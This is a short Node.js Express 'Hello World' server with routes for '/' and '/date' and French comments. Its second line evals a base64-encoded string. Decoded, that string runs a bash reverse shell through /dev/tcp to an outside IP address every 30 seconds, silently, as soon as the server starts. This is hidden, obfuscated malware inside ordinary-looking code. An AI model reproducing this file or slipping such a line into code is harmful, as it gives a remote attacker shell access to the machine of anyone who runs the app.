const express = require('express');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
const app = express();
const port = 3000;

// Définition d'une route pour la méthode GET sur le chemin "/"
app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.get('/date', (req, res) => {
    const date = new Date();
    res.send(date);
  });
app.listen(port, () => {
  console.log(`Serveur en écoute sur http://localhost:${port}`);
});
